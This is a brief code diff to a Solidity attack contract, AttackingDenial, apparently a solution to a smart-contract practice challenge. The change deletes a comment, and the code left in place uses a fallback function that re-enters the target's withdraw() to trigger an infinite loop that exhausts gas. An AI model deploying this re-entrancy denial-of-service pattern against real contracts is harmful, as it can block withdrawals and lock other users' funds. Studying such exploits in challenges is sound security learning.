@@ -9,7 +9,6 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //trigger infinite loop
     fallback() external payable {
         Denial(contractAddress).withdraw();
     }
